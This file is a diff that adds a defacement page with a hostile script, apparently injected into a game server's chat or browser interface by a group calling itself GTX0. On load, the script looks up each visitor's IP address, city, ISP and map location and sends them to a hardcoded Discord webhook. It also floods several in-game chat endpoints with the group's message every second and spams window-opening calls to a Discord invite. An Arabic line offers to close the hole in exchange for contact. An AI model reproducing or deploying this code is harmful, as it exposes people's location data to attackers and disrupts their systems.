@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>#</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+        .anime-image {
+            width: 700px; 
+            max-width: 100%;
+            border: 4px solid #333;
+            border-radius: 23px;
+            margin-bottom: 199px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.8;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 95%;
+            height: 100%;
+            z-index: -3;
+            object-fit: cover;
+        }
+        .ipevil {
+            margin-top: 20px;
+            color: #000ff;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-shadow: 0 0 20px #C0C0C0;
+        }
+        .evil {
+            margin-top: 21px;
+            color: #000ff;
+            font-size: 1.3rem;
+            font-weight: bold;
+            background-color: rgba(150, 2, 5, 0.2);
+            text-shadow: 0 0 5px #C0C0C0;
+            padding: 10px;
+            border-radius: 10px;
+            text-shadow: 0 0 20px #C0C0C0;
+        }
+        pre {
+            color: white;
+            background-color: rgba(0, 0, 0, 0);
+            padding: 10px;
+            border-radius: 15px;
+            text-align: left;
+        }
+    </style>
+</head>
+<body>
+
+    <img class="background" src="https://g.top4top.io/p_35799dzmr1.gif" alt="Background" />
+
+    <div class="container">
+        <img class="anime-image" src="https://i.top4top.io/p_3579n64g11.gif" alt="Anime" />
+
+        <audio autoplay loop>
+            <source src="https://j.top4top.io/m_3639x80td1.mp4" />
+            Your browser does not support the audio element.
+        </audio>
+
+        <div class="ipevil">
+            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br />
+            <pre id="ip-info"></pre>
+        </div>
+
+        <div class="evil">
+            <p>GG/GTX0</p>
+            <p>اذا حابب تسكر الثغرة تواصل مع زومبي اختصار الديسكورد فوق  </p>
+        </div>
+    </div>
+
+    <script>
+        // منع التحديد على الصفحة
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
+        function reEnable() { return true; }
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () { return false; };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // جلب IP والمعلومات
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
+                .then((response) => response.json())
+                .then((ipInfoData) => {
+                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "منيك جديد ");
+                })
+                .catch((error) => {
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1451500213813379122/2f-uJpUOFUb1ZsMML1m3bvY73hhgYS9yk0369TesukOwhWXyAAP1oj_VxDkuDa_JtqSw";
+            const payload = {
+                content: `ابن حرام: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+            fetch(webhookURL, { 
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => console.log("IP sent to Discord!"))
+            .catch(error => console.error(error));
+        }
+
+ const msg = `👑 GTX0 TEAM IS HERE GG/GTX0 ! 👑`;
+  const body = JSON.stringify({ message: msg });
+  setInterval(() => {
+    fetch("https://flix-scripts/chatResult", { method: "POST", body });
+    fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
+    fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+    fetch("https://melix_chat/chatResult", { method: "POST", body });
+    fetch("https://as_chat/chatResult", { method: "POST", body });
+    fetch("https://chat/chatResult", { method: "POST", body });
+    fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+  }, 1000);
+        fetchIPAndInfo();
+
+         setInterval(() => {
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0"); 
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+             window.invokeNative("openUrl", "https://discord.gg/GTX0");
+         }, 100);
+    </script>
+
+</body>
+</html>
